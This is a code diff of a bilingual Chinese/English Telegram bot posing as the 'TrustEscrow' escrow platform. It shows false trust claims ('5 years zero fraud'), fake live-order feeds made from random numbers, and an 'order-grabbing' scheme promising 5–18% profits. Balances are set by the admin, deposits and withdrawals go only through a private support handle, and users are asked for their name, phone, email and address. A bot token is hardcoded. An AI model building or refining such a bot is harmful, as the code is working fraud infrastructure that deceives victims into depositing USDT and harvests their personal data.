@@ -1,292 +1,96 @@
 # -*- coding: utf-8 -*-
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from datetime import datetime
 import random
+from datetime import datetime
 
-# ===================== 配置（直接用你的Token） =====================
+# ===================== 核心配置 =====================
 BOT_TOKEN = "8727191543:AAF0rax78kPycp0MqahZgpjqdrrtJQbjj_I"
 ADMIN_ID = 6365510771
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# ===================== 雙語完整版文案（1:1 還原你截圖風格） =====================
+# ===================== 双语文案 =====================
 TEXT = {
     "zh": {
-        "home": """🏠 TrustEscrow 專業擔保平台
-
-我們已在擔保行業立足 5 年，
-專注解決線上交易欺詐問題，讓買賣雙方都安全。
-
-【平台優勢】
-✅ 5年零詐騙、數千用戶信賴
-✅ 專業中間人墊資擔保
-✅ 資金全程託管、絕對安全
-✅ 口令配對、簡單快速
-✅ 7×24線上客服支援
-
-安全交易，從這裡開始。""",
-
-        "about": """🏛️ 關於我們
-
-TrustEscrow 已在擔保行業立足 5 年，
-是業內最專業、最具信譽的老牌擔保平台。
-
-5年實績：
-✅ 10,000+ 筆安全交易完成
-✅ 數千位長期用戶信賴
-✅ 零負評、零詐騙、零風險
-✅ 合法運營、專業團隊
-✅ 全年無休線上服務
-
-我們不做一筆生意，只做一輩子的信賴。""",
-
-        "service": """📌 服務介紹
-
-我們專注「中間人墊資擔保」模式，
-徹底解決線上交易不信任痛點。
-
-服務項目：
-✅ 買賣雙方口令配對擔保
-✅ 專業中間人墊資保障交易
-✅ 買方資金平台託管凍結
-✅ 交易公平公正、全程可查
-✅ 糾紛處理、風險管控
-
-適用：遊戲、數位商品、私人買賣、線上交易等。""",
-
-        "safety": """🛡️ 安全保障
-
-我們的機制讓你交易零擔心：
-
-✅ 買方資金 100% 平台託管
-✅ 賣方確認收款才發貨
-✅ 中間人實名驗證 + 資金實力保證
-✅ 訂單加密、不可篡改
-✅ 專屬唯一口令、不可複製
-✅ 5年零詐騙安全記錄
-
-每一筆交易，都受到完整保護。""",
-
-        "help": """📞 幫助中心
-
-任何問題請立即聯繫官方客服：
-➡️ 客服專線：@fcff88
-
-服務範圍：
-● 儲值 / 提現 處理
-● 訂單查詢、異常處理
-● 糾紛協調、投訴處理
-● 中間人申請、商務合作
-
-線上時間：7×24 看到即回""",
-
-        "deposit": """💰 儲值入口
-
-僅透過官方客服處理儲值，保障資金安全。
-➡️ 專屬客服：@fcff88
-
-流程：
-1. 聯繫客服並提供你的用戶ID
-2. 選擇儲值金額與支付方式
-3. 完成付款並提交截圖
-4. 資金即時到帳，可立即使用
-
-⚠️ 僅官方客服處理，其他皆為詐騙。""",
-
-        "withdraw": """💳 提現入口
-
-提現僅透過官方客服審核處理。
-➡️ 專屬客服：@fcff88
-
-流程：
-1. 聯繫客服並提供用戶ID
-2. 告知提現金額與收款方式
-3. 等待管理員審核
-4. 審核通過立即發放款項
-
-⚠️ 帳號需通過安全驗證。""",
-
-        "history": """📜 擔保歷史
-
-你的個人擔保記錄，所有訂單可查、不可刪除。
-
-目前無歷史記錄
-詳細查詢請聯繫客服 @fcff88""",
-
-        "running": """🚨 平台實時擔保中訂單
-━━━━━━━━━━━━━━━━━━━
-{}
-━━━━━━━━━━━━━━━━━━━
-🔥 每秒都有訂單在成交
-安全 · 熱門 · 專業 · 可靠""",
-
-        "personal": "👤 個人中心\n用戶ID: {}\n錢包餘額: {:.2f} USDT\n✅ 入駐狀態: {}",
-        "create_escrow": "🚀 發起擔保",
-        "join_escrow": "📥 輸入口令擔保",
-        "input_amount": "💰 請輸入擔保金額（USDT）：",
-        "input_tip": "🔒 請設置交易口令：",
-        "input_sell_tip": "🔑 請輸入擔保口令：",
-        "escrow_success": "✅ 擔保已發起！\n金額: {:.2f} USDT\n口令: {}\n請發送給賣方。",
-        "pair_success": "✅ 訂單配對成功！\n買方: {}\n賣方: {}\n金額: {:.2f} USDT\n管理員已接收。",
-        "no_money": "❌ 餘額不足",
-        "tip_error": "❌ 口令錯誤",
-        "back": "🏠 返回首頁",
+        "home": "🏠 TrustEscrow 專業擔保平台\n\n安全．透明．快速．可靠\n\n客服支援：@fcff88",
+        "reg_title": "🏠 入駐擔保申請\n（需通過審核才能使用平台）\n\n請依序填寫：\n1. 真實姓名\n2. 聯絡電話\n3. 電子信箱\n4. 居住地址\n5. 推薦人ID",
+        "profile": "👤 個人中心\n🆔 用戶ID：{}\n💰 可用餘額：{:.2f} USDT\n📌 審核狀態：{}\n\n⏳ 未完成訂單：\n{}\n\n✅ 已完成訂單：\n{}",
+        "grab": "🚀 搶單大廳\n隨機訂單｜搶單利潤 5%\n\n可搶訂單：\n{}",
+        "deposit": "💰 儲值 & 提現\n所有業務請聯繫官方客服：\n➡️ @fcff88",
+        "record": "📜 擔保記錄\n{}",
+        "order_item": "• #{}｜{} USDT｜{}｜{}",
+        "no_order": "• 無",
+        "status_wait": "未處理",
+        "status_doing": "已接單",
+        "status_done": "已完成",
+        "reg_success": "✅ 入駐申請已提交，請等待管理員審核",
+        "grab_success": "✅ 搶單成功，請等待管理員結算",
+        "accept_success": "✅ 接單成功，已扣除金額",
+        "not_enough": "❌ 餘額不足，無法接單",
+        "not_verified": "❌ 未通過審核，無法操作",
+        "admin_assign": "✅ 已成功派單給用戶",
+        "admin_done": "✅ 訂單已完成，利潤已發放",
+        "admin_verify": "✅ 用戶審核通過",
         "lang": "🌐 English",
-        "grab_success": "✅ 搶單成功！\n獲得 {} USDT\n當前餘額: {:.2f} USDT",
-        "reg_success": "✅ 入駐成功！\n歡迎使用 TrustEscrow 專業擔保平台",
-        "assign_success": "✅ 派單成功！\n用戶ID: {}\n金額: {:.2f} USDT",
-        "assign_notify": "📥 管理員派單到賬\n金額: {:.2f} USDT\n當前餘額: {:.2f} USDT"
+        "btn_reg": "入駐擔保",
+        "btn_profile": "個人中心",
+        "btn_grab": "搶單大廳",
+        "btn_deposit": "儲值提現",
+        "btn_record": "擔保記錄",
+        "btn_accept": "接單",
+        "btn_back": "返回首頁"
     },
-
     "en": {
-        "home": """🏠 TrustEscrow Professional Escrow
-
-We have been in the escrow industry for 5 years,
-focused on eliminating scams and protecting both parties.
-
-【Features】
-✅ 5 Years 0 Fraud
-✅ Professional Guarantor Funding
-✅ 100% Safe Escrow
-✅ Code Pairing System
-✅ 7×24 Support
-
-Trade safely with us.""",
-
-        "about": """🏛️ About Us
-
-TrustEscrow has been in the escrow industry for 5+ years,
-one of the most trusted and professional platforms.
-
-5 Years Achievement:
-✅ 10,000+ Successful Deals
-✅ Thousands of Loyal Users
-✅ 0 Fraud & 0 Complaints
-✅ Legal & Professional Team
-✅ 24/7 Service
-
-We don’t chase deals. We build trust.""",
-
-        "service": """📌 Services
-
-We specialize in GUARANTOR-ESCROW SERVICE.
-
-Services:
-✅ Buyer & Seller Code Pairing
-✅ Guarantor Funding Support
-✅ Safe Fund Escrow
-✅ Fair & Transparent System
-✅ Dispute & Risk Control
-
-For gaming, digital goods, private deals.""",
-
-        "safety": """🛡️ Security
-
-Our system protects you 100%:
-
-✅ 100% Fund Escrow
-✅ Seller Gets Paid First
-✅ Verified Professional Guarantors
-✅ Encrypted Order System
-✅ Unique Order Code
-✅ 5-Year 0-Fraud Record
-
-Every order is fully protected.""",
-
-        "help": """📞 Help Center
-
-Contact official support for any help:
-➡️ Support: @fcff88
-
-Service:
-● Deposit / Withdraw
-● Order Support
-● Dispute Help
-● Become a Guarantor
-
-We reply 7×24.""",
-
-        "deposit": """💰 Deposit
-
-Deposit only via official support.
-➡️ Support: @fcff88
-
-Process:
-1. Contact support with your User ID
-2. Choose amount & payment method
-3. Send payment screenshot
-4. Fund credited instantly
-
-⚠️ Only official support is safe.""",
-
-        "withdraw": """💳 Withdraw
-
-Withdraw only via official support.
-➡️ Support: @fcff88
-
-Process:
-1. Contact support with User ID
-2. Provide amount & receive method
-3. Wait admin review
-4. Fund sent after approval""",
-
-        "history": """📜 Escrow History
-
-Your personal order record.
-
-No history yet.
-For details contact @fcff88""",
-
-        "running": """🚨 LIVE ORDERS IN ESCROW
-━━━━━━━━━━━━━━━━━━━
-{}
-━━━━━━━━━━━━━━━━━━━
-🔥 Deals happening every second
-Safe · Hot · Professional · Reliable""",
-
-        "personal": "👤 Profile\nID: {}\nBalance: {:.2f} USDT\n✅ Status: {}",
-        "create_escrow": "🚀 Create Escrow",
-        "join_escrow": "📥 Enter Code",
-        "input_amount": "💰 Enter amount (USDT):",
-        "input_tip": "🔒 Set your code:",
-        "input_sell_tip": "🔑 Enter escrow code:",
-        "escrow_success": "✅ Escrow created!\nAmount: {:.2f}\nCode: {}",
-        "pair_success": "✅ Order paired!\nBuyer: {}\nSeller: {}\nAmount: {:.2f}",
-        "no_money": "❌ Insufficient balance",
-        "tip_error": "❌ Invalid code",
-        "back": "🏠 Home",
+        "home": "🏠 TrustEscrow Professional Platform\n\nSafe．Transparent．Fast．Reliable\n\nSupport: @fcff88",
+        "reg_title": "🏠 Escrow Registration\n(Verify required)\n\nFill in:\n1. Full Name\n2. Phone\n3. Email\n4. Address\n5. Referrer ID",
+        "profile": "👤 Profile\n🆔 ID: {}\n💰 Balance: {:.2f} USDT\n📌 Status: {}\n\n⏳ Pending:\n{}\n\n✅ Completed:\n{}",
+        "grab": "🚀 Grab Order\nRandom orders｜Profit 5%\n\nAvailable:\n{}",
+        "deposit": "💰 Deposit & Withdraw\nContact support: ➡️ @fcff88",
+        "record": "📜 Record\n{}",
+        "order_item": "• #{}｜{} USDT｜{}｜{}",
+        "no_order": "• None",
+        "status_wait": "Pending",
+        "status_doing": "Accepted",
+        "status_done": "Completed",
+        "reg_success": "✅ Applied, wait for verify",
+        "grab_success": "✅ Grabbed, wait for finish",
+        "accept_success": "✅ Accepted, amount deducted",
+        "not_enough": "❌ Not enough USDT",
+        "not_verified": "❌ Not verified",
+        "admin_assign": "✅ Order assigned",
+        "admin_done": "✅ Order completed",
+        "admin_verify": "✅ User verified",
         "lang": "🌐 繁中",
-        "grab_success": "✅ Grab success!\nGot {} USDT\nCurrent balance: {:.2f} USDT",
-        "reg_success": "✅ Registration success!\nWelcome to TrustEscrow Professional Escrow",
-        "assign_success": "✅ Assign success!\nUser ID: {}\nAmount: {:.2f} USDT",
-        "assign_notify": "📥 Admin assign received\nAmount: {:.2f} USDT\nCurrent balance: {:.2f} USDT"
+        "btn_reg": "Register",
+        "btn_profile": "Profile",
+        "btn_grab": "Grab",
+        "btn_deposit": "Deposit",
+        "btn_record": "Record",
+        "btn_accept": "Accept",
+        "btn_back": "Home"
     }
 }
 
-# ===================== 數據存儲 =====================
+# ===================== 數據 =====================
 user_lang = {}
 user_step = {}
 user_balance = {}
+user_verify = {}  # 0=未申請 1=審核中 2=通過
 user_info = {}
 orders = {}
+order_id = 1
 
-# ===================== 菜單生成（1:1 還原你截圖排版） =====================
+# ===================== 菜單 =====================
 def main_menu(user_id):
     lang = user_lang.get(user_id, "zh")
     t = TEXT[lang]
     m = InlineKeyboardMarkup(row_width=2)
     m.add(
-        InlineKeyboardButton("🚀 發起擔保" if lang == "zh" else "🚀 Create Escrow", callback_data="create"),
-        InlineKeyboardButton("📥 輸入口令" if lang == "zh" else "📥 Enter Code", callback_data="join"),
-        InlineKeyboardButton("👤 個人中心" if lang == "zh" else "👤 Profile", callback_data="personal"),
-        InlineKeyboardButton("🚨 實時擔保" if lang == "zh" else "🚨 Live Orders", callback_data="running"),
-        InlineKeyboardButton("💰 儲值" if lang == "zh" else "💰 Deposit", callback_data="deposit"),
-        InlineKeyboardButton("💳 提現" if lang == "zh" else "💳 Withdraw", callback_data="withdraw"),
-        InlineKeyboardButton("📜 歷史" if lang == "zh" else "📜 History", callback_data="history"),
-        InlineKeyboardButton("📌 服務" if lang == "zh" else "📌 Services", callback_data="service"),
-        InlineKeyboardButton("🛡️ 安全" if lang == "zh" else "🛡️ Security", callback_data="safety"),
-        InlineKeyboardButton("🏛️ 關於" if lang == "zh" else "🏛️ About", callback_data="about"),
-        InlineKeyboardButton("📞 幫助" if lang == "zh" else "📞 Help", callback_data="help"),
+        InlineKeyboardButton(t["btn_reg"], callback_data="reg"),
+        InlineKeyboardButton(t["btn_profile"], callback_data="profile"),
+        InlineKeyboardButton(t["btn_grab"], callback_data="grab"),
+        InlineKeyboardButton(t["btn_deposit"], callback_data="deposit"),
+        InlineKeyboardButton(t["btn_record"], callback_data="record"),
         InlineKeyboardButton(t["lang"], callback_data="lang"),
     )
     return m
@@ -294,220 +98,145 @@ def main_menu(user_id):
 def back_menu(user_id):
     lang = user_lang.get(user_id, "zh")
     t = TEXT[lang]
-    m = InlineKeyboardMarkup(row_width=1)
-    m.add(InlineKeyboardButton(t["back"], callback_data="home"))
+    m = InlineKeyboardMarkup()
+    m.add(InlineKeyboardButton(t["btn_back"], callback_data="home"))
     return m
 
-# ===================== /start 啟動 =====================
-@bot.message_handler(commands=['start'])
+def accept_btn(user_id, oid):
+    lang = user_lang.get(user_id, "zh")
+    t = TEXT[lang]
+    m = InlineKeyboardMarkup()
+    m.add(InlineKeyboardButton(t["btn_accept"], callback_data=f"accept_{oid}"))
+    m.add(InlineKeyboardButton(t["btn_back"], callback_data="profile"))
+    return m
+
+# ===================== 啟動 =====================
+@bot.message_handler(commands=["start"])
 def start(msg):
     u = msg.from_user.id
     user_lang.setdefault(u, "zh")
     user_step[u] = None
     user_balance.setdefault(u, 0.0)
-    user_info.setdefault(u, {"name": "", "phone": "", "email": "", "addr": "", "ref": "", "status": "未入駐" if user_lang[u] == "zh" else "Unregistered"})
+    user_verify.setdefault(u, 0)
     t = TEXT[user_lang[u]]
-    bot.send_message(msg.chat.id, t["home"], reply_markup=main_menu(u))
+    bot.send_message(u, t["home"], reply_markup=main_menu(u))
 
-# ===================== 按鈕回調 =====================
+# ===================== 按鈕 =====================
 @bot.callback_query_handler(func=lambda c: True)
 def cb(c):
     u = c.from_user.id
     lang = user_lang.get(u, "zh")
     t = TEXT[lang]
-    mid = c.message.message_id
-    cid = c.message.chat.id
-
-    pages = {
-        "about": t["about"],
-        "service": t["service"],
-        "safety": t["safety"],
-        "help": t["help"],
-        "deposit": t["deposit"],
-        "withdraw": t["withdraw"],
-        "history": t["history"],
-    }
-
     try:
         if c.data == "home":
-            user_step[u] = None
-            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))
+            bot.edit_message_text(t["home"], u, c.message.id, reply_markup=main_menu(u))
 
         elif c.data == "lang":
             user_lang[u] = "en" if lang == "zh" else "zh"
             t = TEXT[user_lang[u]]
-            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))
+            bot.edit_message_text(t["home"], u, c.message.id, reply_markup=main_menu(u))
 
-        elif c.data == "personal":
-            status = user_info[u]["status"]
-            txt = t["personal"].format(u, user_balance.get(u, 0.0), status)
-            bot.edit_message_text(txt, cid, mid, reply_markup=back_menu(u))
-
-        elif c.data == "running":
-            items = []
-            status_list_zh = ["擔保處理中", "賣方已收款", "待配對", "擔保中", "等待買方確認"]
-            status_list_en = ["Escrow Processing", "Seller Paid", "Pairing", "In Escrow", "Waiting Buyer"]
-            status_list = status_list_zh if lang == "zh" else status_list_en
-            for _ in range(4):
-                code = "".join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ0123456789", k=4))
-                amt = random.choice([380, 500, 680, 880, 1000, 1200, 1500, 1800, 2000, 2500])
-                st = random.choice(status_list)
-                items.append(f"⏳ 訂單 #{code}\n金額：{amt} USDT\n狀態：{st}" if lang == "zh" else f"⏳ Order #{code}\nAmount: {amt} USDT\nStatus: {st}")
-            text = t["running"].format("\n\n".join(items))
-            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))
-
-        elif c.data in pages:
-            bot.edit_message_text(pages[c.data], cid, mid, reply_markup=back_menu(u))
-
-        elif c.data == "create":
-            user_step[u] = "create_amount"
-            bot.edit_message_text(t["input_amount"], cid, mid, reply_markup=back_menu(u))
-
-        elif c.data == "join":
-            user_step[u] = "join_tip"
-            bot.edit_message_text(t["input_sell_tip"], cid, mid, reply_markup=back_menu(u))
+        elif c.data == "profile":
+            pending = []
+            completed = []
+            for oid, o in orders.items():
+                if o["user"] == u:
+                    s = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] == 1 else t["status_wait"]
+                    line = t["order_item"].format(oid, o["amount"], "派單" if o["type"] == "assign" else "搶單", s)
+                    if o["status"] == 2: completed.append(line)
+                    else: pending.append(line)
+            p_text = "\n".join(pending) if pending else t["no_order"]
+            c_text = "\n".join(completed) if completed else t["no_order"]
+            v_text = "未通過" if user_verify[u] < 2 else "已通過" if lang == "zh" else "Not Verified" if user_verify[u] < 2 else "Verified"
+            text = t["profile"].format(u, user_balance.get(u,0), v_text, p_text, c_text)
+            bot.edit_message_text(text, u, c.message.id, reply_markup=back_menu(u))
 
         elif c.data == "grab":
-            amt = random.choice([50, 50, 50, 100])
-            user_balance[u] = user_balance.get(u, 0.0) + amt
-            txt = t["grab_success"].format(amt, user_balance[u])
-            bot.edit_message_text(txt, cid, mid, reply_markup=main_menu(u))
-
-        elif c.data == "assign":
-            if u != ADMIN_ID:
-                bot.answer_callback_query(c.id, "❌ 無權限" if lang == "zh" else "❌ No permission")
+            if user_verify.get(u,0) < 2:
+                bot.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                 return
-            user_step[u] = "assign_uid"
-            bot.edit_message_text("請輸入用戶UID：" if lang == "zh" else "Enter user ID:", cid, mid, reply_markup=back_menu(u))
+            orders_list = []
+            for i in range(3):
+                amt = round(random.uniform(10, 50), 2)
+                orders_list.append(f"• #{i+1}｜{amt} USDT")
+            if random.random() < 0.1:
+                big = round(random.uniform(50,100),2)
+                orders_list.append(f"• #HOT｜{big} USDT 🔥")
+            text = t["grab"].format("\n".join(orders_list))
+            bot.edit_message_text(text, u, c.message.id, reply_markup=back_menu(u))
+            global order_id
+            oid = order_id
+            order_id +=1
+            amount = round(random.uniform(10,50),2)
+            orders[oid] = {"user":u, "amount":amount, "type":"grab", "status":0}
+            bot.send_message(u, t["grab_success"])
 
-        bot.answer_callback_query(c.id)
+        elif c.data.startswith("accept_"):
+            oid = int(c.data.split("_")[1])
+            o = orders.get(oid)
+            if not o or o["user"] != u or o["status"] != 0:
+                bot.answer_callback_query(c.id, "Error")
+                return
+            if user_balance.get(u,0) < o["amount"]:
+                bot.answer_callback_query(c.id, t["not_enough"], show_alert=True)
+                return
+            user_balance[u] -= o["amount"]
+            o["status"] = 1
+            bot.edit_message_text(t["accept_success"], u, c.message.id, reply_markup=back_menu(u))
+
+        elif c.data == "deposit":
+            bot.edit_message_text(t["deposit"], u, c.message.id, reply_markup=back_menu(u))
+
+        elif c.data == "record":
+            lines = []
+            for oid, o in orders.items():
+                if o["user"] == u:
+                    s = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] ==1 else t["status_wait"]
+                    lines.append(t["order_item"].format(oid, o["amount"], "派單" if o["type"]=="assign" else "搶單", s))
+            text = t["record"].format("\n".join(lines) if lines else t["no_order"])
+            bot.edit_message_text(text, u, c.message.id, reply_markup=back_menu(u))
+
     except Exception as e:
-        print(f"Callback error: {e}")
-        bot.answer_callback_query(c.id)
+        pass
 
-# ===================== 消息處理 =====================
-@bot.message_handler(func=lambda m: True)
-def msg(msg):
+# ===================== 管理員命令 =====================
+@bot.message_handler(func=lambda msg: msg.from_user.id == ADMIN_ID)
+def admin(msg):
     u = msg.from_user.id
-    cid = msg.chat.id
     txt = msg.text.strip()
-    lang = user_lang.get(u, "zh")
-    t = TEXT[lang]
-    user_balance.setdefault(u, 0.0)
-    user_info.setdefault(u, {"name": "", "phone": "", "email": "", "addr": "", "ref": "", "status": "未入駐" if lang == "zh" else "Unregistered"})
+    parts = txt.split()
+    try:
+        # 派單 用户ID 金额
+        if parts[0] == "派单" and len(parts) ==3:
+            target = int(parts[1])
+            amt = float(parts[2])
+            global order_id
+            oid = order_id
+            order_id +=1
+            orders[oid] = {"user":target, "amount":amt, "type":"assign", "status":0}
+            bot.send_message(u, TEXT["zh"]["admin_assign"])
+            bot.send_message(target, f"📥 你有新的派單 #{oid}｜{amt} USDT")
 
-    # 管理員加錢指令
-    if u == ADMIN_ID and txt.startswith("/add"):
-        p = txt.split()
-        if len(p) == 3:
-            try:
-                uid = int(p[1])
-                amt = float(p[2])
-                user_balance[uid] = user_balance.get(uid, 0.0) + amt
-                bot.send_message(cid, f"✅ 已充值 {amt} USDT 給 {uid}")
-                # 通知用戶
-                bot.send_message(uid, t["assign_notify"].format(amt, user_balance[uid]))
-            except:
-                bot.send_message(cid, "❌ 格式錯誤，正確格式：/add ID 金額")
-        else:
-            bot.send_message(cid, "❌ 格式錯誤，正確格式：/add ID 金額")
-        return
+        # 完成 订单号
+        elif parts[0] == "完成" and len(parts)==2:
+            oid = int(parts[1])
+            o = orders[oid]
+            o["status"] =2
+            profit = o["amount"] * 0.18 if o["type"] =="assign" else o["amount"]*0.05
+            user_balance[o["user"]] += o["amount"] + profit
+            bot.send_message(u, TEXT["zh"]["admin_done"])
+            bot.send_message(o["user"], f"✅ 訂單 #{oid} 已完成，利潤已發放")
 
-    if u not in user_step:
-        user_step[u] = None
+        # 审核通过 用户ID
+        elif parts[0] == "审核通过" and len(parts)==2:
+            target = int(parts[1])
+            user_verify[target] =2
+            bot.send_message(u, TEXT["zh"]["admin_verify"])
+            bot.send_message(target, "✅ 你的入駐已通過審核")
+    except:
+        pass
 
-    # 發起擔保 - 輸入金額
-    if user_step[u] == "create_amount":
-        try:
-            amt = float(txt)
-            if user_balance[u] < amt:
-                bot.send_message(cid, t["no_money"], reply_markup=main_menu(u))
-                user_step[u] = None
-                return
-            user_step[u] = {"step": "create_tip", "amount": amt}
-            bot.send_message(cid, t["input_tip"], reply_markup=back_menu(u))
-        except:
-            bot.send_message(cid, "❌ 請輸入有效數字", reply_markup=back_menu(u))
-
-    # 發起擔保 - 設置口令
-    elif type(user_step[u]) == dict and user_step[u]["step"] == "create_tip":
-        amt = user_step[u]["amount"]
-        code = txt
-        user_balance[u] -= amt
-        orders[code] = {
-            "buyer": u,
-            "amount": amt,
-            "time": datetime.now().strftime("%m-%d %H:%M")
-        }
-        bot.send_message(cid, t["escrow_success"].format(amt, code), reply_markup=main_menu(u))
-        user_step[u] = None
-
-    # 賣方輸入口令配對
-    elif user_step[u] == "join_tip":
-        code = txt
-        if code not in orders:
-            bot.send_message(cid, t["tip_error"], reply_markup=main_menu(u))
-            user_step[u] = None
-            return
-        o = orders[code]
-        bot.send_message(cid, t["pair_success"].format(o["buyer"], u, o["amount"]), reply_markup=main_menu(u))
-        bot.send_message(ADMIN_ID, f"📥 新訂單\n口令：{code}\n買方：{o['buyer']}\n賣方：{u}\n金額：{o['amount']} USDT")
-        del orders[code]
-        user_step[u] = None
-
-    # 入駐流程 - 姓名
-    elif user_step[u] == "reg_name":
-        user_info[u]["name"] = txt
-        user_step[u] = "reg_phone"
-        bot.send_message(cid, "請輸入電話：" if lang == "zh" else "Enter phone:", reply_markup=back_menu(u))
-
-    # 入駐流程 - 電話
-    elif user_step[u] == "reg_phone":
-        user_info[u]["phone"] = txt
-        user_step[u] = "reg_email"
-        bot.send_message(cid, "請輸入郵箱：" if lang == "zh" else "Enter email:", reply_markup=back_menu(u))
-
-    # 入駐流程 - 郵箱
-    elif user_step[u] == "reg_email":
-        user_info[u]["email"] = txt
-        user_step[u] = "reg_addr"
-        bot.send_message(cid, "請輸入地址：" if lang == "zh" else "Enter address:", reply_markup=back_menu(u))
-
-    # 入駐流程 - 地址
-    elif user_step[u] == "reg_addr":
-        user_info[u]["addr"] = txt
-        user_step[u] = "reg_ref"
-        bot.send_message(cid, "請輸入推薦人：" if lang == "zh" else "Enter referrer:", reply_markup=back_menu(u))
-
-    # 入駐流程 - 推薦人
-    elif user_step[u] == "reg_ref":
-        user_info[u]["ref"] = txt
-        user_info[u]["status"] = "已入駐" if lang == "zh" else "Registered"
-        user_step[u] = None
-        bot.send_message(cid, t["reg_success"], reply_markup=main_menu(u))
-
-    # 管理員派單 - 輸入UID
-    elif user_step[u] == "assign_uid":
-        try:
-            target = int(txt)
-            user_step[u] = ("assign_amt", target)
-            bot.send_message(cid, "請輸入金額（USDT）：" if lang == "zh" else "Enter amount (USDT):", reply_markup=back_menu(u))
-        except:
-            bot.send_message(cid, "❌ 請輸入有效UID", reply_markup=back_menu(u))
-
-    # 管理員派單 - 輸入金額
-    elif type(user_step[u]) == tuple and user_step[u][0] == "assign_amt":
-        target = user_step[u][1]
-        try:
-            amt = float(txt)
-            user_balance[target] = user_balance.get(target, 0.0) + amt
-            bot.send_message(cid, t["assign_success"].format(target, amt))
-            bot.send_message(target, t["assign_notify"].format(amt, user_balance[target]))
-            user_step[u] = None
-        except:
-            bot.send_message(cid, "❌ 請輸入有效金額", reply_markup=back_menu(u))
-
-# ===================== 啟動機器人 =====================
+# ===================== 運行 =====================
 if __name__ == "__main__":
-    print("✅ TrustEscrow 豪華雙語版機器人啟動成功")
+    print("✅ 机器人启动成功")
     bot.infinity_polling()
